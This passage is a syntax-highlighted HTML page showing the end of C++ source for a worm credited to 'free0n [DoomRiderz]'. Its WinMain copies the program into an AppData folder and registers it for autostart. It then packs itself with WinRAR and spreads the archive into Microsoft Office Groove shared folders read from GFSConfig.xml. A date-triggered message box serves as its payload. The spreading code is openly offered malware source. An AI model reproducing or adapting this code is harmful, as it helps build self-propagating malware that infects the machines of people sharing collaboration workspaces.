   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wDay</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">16</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">time</span><span class="sc10">.</span><span class="sc11">wMonth</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)</span><span class="sc0"> 
   </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc2">//A sPecial Secret Message for Someone on this Day
</span><span class="sc0">      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc6">"Help sAve PeoPle other than Yourself - Burn Down the Angelic evils that haunt You"</span><span class="sc10">,</span><span class="sc6">"Grooovy by free0n [DoomRiderz]"</span><span class="sc10">,</span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">      
   </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//main program execution
//works like this
//1. gets our path
//2. gets our xml path that stores all the groove repositories
//   the groove repositories will be our destination folders for copying our worm
//3. if xml file exists then get repositories and continue
//4. Create a directory and dump a copy of ourself in it
//5. Add the copy to the auto startup
//6. If WinRaR is on the system then RaR up the directory with our .exe and continue
//7. Check to see if we got any repository paths, if we do then copy our rar file to
//   those paths and continue
//8. Delete our rar file cause that would have been created in our main app directory
//9. Then run our msgbox payload
</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hThisInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpszArgument</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nFunsterStil</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
          
    </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">groovey</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">AppDataDir</span><span class="sc10">(),</span><span class="sc6">"\Groovy"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CreateDirectory</span><span class="sc10">(</span><span class="sc11">groovey</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">groovey</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc6">"\groovy.exe"</span><span class="sc10">;</span><span class="sc0">
       
    </span><span class="sc11">AutoRun</span><span class="sc10">(</span><span class="sc11">groovey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc11">groovey</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">(),</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WinRaR</span><span class="sc10">(</span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">AppDataDir</span><span class="sc10">(),</span><span class="sc12">"\Groovy\"));
</span><span class="sc0">    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">))</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc2">//spread using ms office groove
</span><span class="sc0">       </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">AppDataDir</span><span class="sc10">(),</span><span class="sc6">"\Microsoft\Office\Groove\User\GFSConfig.xml"</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">groovePaths</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ParsePaths</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">groovePaths</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
       </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">))</span><span class="sc0"> 
          </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">Spread</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">groovePaths</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"groovy.rar"</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc11">Payload</span><span class="sc10">();</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">                            
       </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> 
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
